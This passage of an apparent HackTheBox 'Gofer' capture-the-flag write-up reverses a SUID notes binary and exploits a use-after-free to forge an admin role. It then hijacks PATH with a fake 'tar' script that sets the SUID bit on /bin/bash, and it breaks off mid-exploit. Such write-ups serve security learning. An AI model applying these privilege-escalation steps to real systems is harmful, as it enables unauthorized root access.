+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+It indicates that I don't have the <code>admin</code> role, considering that in option number 2, it displays our role as <code>user</code>.<br/><br/>
+Upon selecting option 3, it appears to delete the user we've created.<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">3</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+If we attempt to list our information using option 2, the following is displayed:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">2</span>
+
+
+<span class="n">Username</span><span class="p">:</span> 
+<span class="n">Role</span><span class="p">:</span> <span class="n">user</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+The <code>username</code> field is empty; it seems the information has been deleted.<br/><br/>
+If we restart the program and select option 2 without creating the user previously, a different error is displayed.<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">2</span>
+
+<span class="n">First</span> <span class="n">create</span> <span class="n">an</span> <span class="n">user</span><span class="err">!</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+It seems that option 3 doesn't entirely delete the user we created.<br/><br/>
+<h3><br>Binary Analysis</br></h3><br>
+To perform a more in-depth analysis of the binary, I'll use the <a href="https://ghidra-sre.org/">Ghidra</a> tool for reverse engineering.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/21.png"/><br/><br/>
+The first thing that caught my attention was option 8, which required an <code>admin</code> role to access it.<br/><br/>
+Upon reading its code, we see the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/22.png"/><br/><br/>
+At first glance, it appears that by becoming an admin, we can exploit Path Hijacking during the execution of the <code>system()</code> function. This is because the <code>tar</code> tool is being called relatively.<br/><br/>
+Firstly, at the beginning of the program, we notice a set of variables and pointers being defined.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/24.png"/><br/><br/>
+The variable where the user-entered options are stored is named <code>local_1c</code>:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/25.png"/><br/><br/>
+Thanks to the <code>switch()</code> statement, we confirm that the variable <code>local_1c</code> corresponds to the user-input options.<br/><br/>
+In option <code>1</code>, we observe the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/26.png"/><br/><br/>
+Initially, a request is made to the Heap for 0x28 bytes of memory, which in decimal is equivalent to 40 bytes. This memory section will be pointed to by the pointer <code>local_10</code>.<br/><br/>
+Subsequently, it checks whether the <code>local_10</code> pointer is null. If this occurs, it is likely that the memory allocation from the preceding line was unsuccessful, leading the program to exit using the <code>exit()</code> function.<br/><br/>
+Utilizing the <code>memset()</code> function, the first 24 bytes of the memory section pointed to by <code>local_10</code> are being filled with zeros. Then, in the second <code>memset()</code> function call, the remaining memory pointed to by <code>local_10</code> is filled with zeros.<br/><br/>
+It's important to note that the pointer <code>local_10</code> is referencing a memory section of 40 bytes in size. Hence, the first <code>memset()</code> call zeroes out the initial 24 bytes, leaving the remaining bytes (0x10, which is 16 in decimal) to be filled with zeros.<br/><br/>
+Subsequently, a variable named <code>_Var1</code> is defined:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/27.png"/><br/><br/>
+In this section of the code, a variable named <code>_Var1</code> is declared to store the UID (User ID) of the user running this program. In our case, we'll be running it as the user <code>tbuckley</code>, so it will have the value <code>1002</code>.<br/><br/>
+Following this, there's a comparison involving the value of <code>_Var1</code>, in simple terms, checking if the user running the program is the root user.<br/><br/>
+If the user running the program is the root user, the string <code>admin</code> will be assigned to the memory section located 24 bytes from the start of the memory sector pointed to by <code>local_10</code>. Otherwise, if the user running the program is not root, the string <code>user</code> will be assigned.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/28.png"/><br/><br/>
+Finally, the console displays the message <code>Choose an username:</code>, and then it requests a value to be entered, which will be stored in the memory section pointed to by <code>local_10</code>.<br/><br/>
+This entire process pertains to the creation of a user. If we navigate to option 2, we encounter the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/29.png"/><br/><br/>
+Initially, it checks whether the pointer <code>local_10</code> is null; if it's not null, it displays information about our user on the screen.<br/><br/>
+Firstly, it displays the string to which <code>local_10</code> points, in this case, it will be the username specified in option 1. Then, it shows the string located 24 bytes after the start of <code>local_10</code>.<br/><br/>
+The issue lies within option 3:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/30.png"/><br/><br/>
+When the pointer <code>local_10</code> is not null (meaning we've previously created a user), the memory allocated, pointed to by <code>local_10</code> and initially obtained by using <code>malloc(0x28)</code>, is released back to the Heap.<br/><br/>
+The vulnerability arises from the fact that even though the memory is freed, the pointer continues to point to the same memory section. Consequently, if memory is requested from the Heap again and assigned to the memory section pointed to by <code>local_10</code>, it becomes possible to access any information in that section using this pointer.<br/><br/>
+In essence, since <code>local_10</code> doesn't become null again, it keeps pointing to the same memory section. After the memory has been freed, if elsewhere in the program new memory is allocated, it can be accessed through <code>local_10</code>.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/31.png"/><br/><br/>
+In option 4, we are given the opportunity to write a note. Initially, we notice that memory is being requested from the heap again, this time a total of 40 bytes.<br/><br/>
+Subsequently, the 40 bytes are filled with zeros. Then, it performs a check to verify if there have been no issues with the pointer. Afterward, it displays a message <code>Write your note:</code>, prompting us to provide data that will be stored in the memory section pointed to by <code>local_18</code>.<br/><br/>
+Let's recall that when we "delete" our user, the allocated memory is freed, but the issue lies in the fact that <code>local_10</code> continues to point to that memory section.<br/><br/>
+Later, when creating a note, the same amount of memory is requested again. This will allocate the same block of memory previously reserved by <code>local_10</code>, although this time it will be pointed to by <code>local_18</code>. However, since <code>local_10</code> still points to that memory section, we can access it.<br/><br/>
+In option 7, when deleting the note, it does so correctly by setting the <code>local_18</code> pointer to null, preventing its further use.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/32.png"/><br/><br/>
+Knowing this, our plan is to initialize the <code>local_10</code> pointer to point to the memory block we requested in option 1, entering our username, and being assigned the <code>user</code> role.<br/><br/>
+Subsequently, we will delete our user, freeing the previously allocated memory. Then, we'll create a new note with special content. Our goal is to overwrite our role, so we need to input an appropriate string.<br/><br/>
+By entering the correct string, when listing the user information in option 2, it will display the content of the note because <code>local_10</code> continues to point to the same memory section.<br/><br/>
+Let's proceed with the test. I'll create the user <code>elswix</code> using option 1:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Choose</span> <span class="n">an</span> <span class="n">username</span><span class="p">:</span> <span class="n">elswix</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+Let's remember that this option requested a block of 40 bytes of memory that will be pointed to by the pointer <code>local_10</code>.<br/><br/>
+Now, let's list the information of our user using option 2:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">2</span>
+
+
+<span class="n">Username</span><span class="p">:</span> <span class="n">elswix</span>
+<span class="n">Role</span><span class="p">:</span> <span class="n">user</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+Nothing out of the ordinary, it displays the username we entered and our role.<br/><br/>
+Next, I'll select option 3 to "delete" my user and thus free the memory pointed to by <code>local_10</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">3</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+If we attempt to list the information of our user, we see that the <code>username</code> field is empty:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">2</span>
+
+
+<span class="n">Username</span><span class="p">:</span> 
+<span class="n">Role</span><span class="p">:</span> <span class="n">user</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+If it were properly implemented, upon entering option 2 after having "deleted" our user, it should display the message <code>First create an user!</code>.<br/><br/>
+Now, I will create a note with any content:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">4</span>
+
+<span class="n">Write</span> <span class="n">your</span> <span class="n">note</span><span class="p">:</span>
+<span class="n">this</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">test</span>
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+Now, if we list the information of our user:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">2</span>
+
+
+<span class="n">Username</span><span class="p">:</span> <span class="n">this</span>
+<span class="n">Role</span><span class="p">:</span> 
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+I see the string <code>this</code>, which corresponds to the first word I entered in the previously created note. This occurs because both pointers <code>local_10</code> and <code>local_18</code> point to the same memory section. By exploiting the <code>local_10</code> pointer, I can view the content of the note.<br/><br/>
+To exploit this and assign ourselves the admin role, we need to remember where in the memory block the username and role are allocated.<br/><br/>
+The username corresponds to the first 24 bytes of the memory block pointed to by <code>local_10</code>, and the role occupies the remaining bytes to complete the memory block, which are approximately 16 bytes.<br/><br/>
+As we're overwriting the memory pointed to by <code>local_10</code> through option 4, we should input the first 24 bytes as if they were a username (24 arbitrary characters). Following these 24 bytes, we should enter the string <code>admin</code> because this will belong to the role field.<br/><br/>
+We'll follow the same process as before, but when writing the note in option 4, I'll input the following string:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">4</span>
+
+<span class="n">Write</span> <span class="n">your</span> <span class="n">note</span><span class="p">:</span>
+<span class="n">BBBBBBBBBBBBBBBBBBBBBBBBadmin</span>
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+I filled the first 24 bytes with the character <code>B</code>, and then added the string <code>admin</code>.<br/><br/>
+Now, if we list the user information:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">2</span>
+
+
+<span class="n">Username</span><span class="p">:</span> <span class="n">BBBBBBBBBBBBBBBBBBBBBBBBadmin</span>
+<span class="n">Role</span><span class="p">:</span> <span class="n">admin</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+We've overwritten the role field, successfully obtaining the <code>admin</code> role. Thanks to this, we can access option 8:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">8</span>
+
+<span class="n">Access</span> <span class="n">granted</span><span class="err">!</span>
+<span class="n">tar</span><span class="p">:</span> <span class="n">Removing</span> <span class="n">leading</span> <span class="err">`</span><span class="o">/</span><span class="s1">' from member names</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">notes</span><span class="o">/</span>
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+We encounter an error with the <code>tar</code> tool. As we may recall, this tool is executed relative to the system level. Therefore, we can create a malicious bash script named <code>tar</code> in the current working directory. Subsequently, when executing the Set-UID binary, we specify a path that includes the current directory.<br/><br/>
+This is the content of the bash script:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">tar</span>
+<span class="c1">#!/bin/bash</span>
+<span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+</pre></div>
+
+We need to assign it execution permissions:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">tar</span>
+</pre></div>
+
+Now, let's execute the Set-UID binary while specifying the PATH:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">PATH</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">pwd</span><span class="p">):</span><span class="err">$</span><span class="n">PATH</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">notes</span>
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+After completing the exploitation process, we select option 8:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">8</span>
+
+<span class="n">Access</span> <span class="n">granted</span><span class="err">!</span>
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
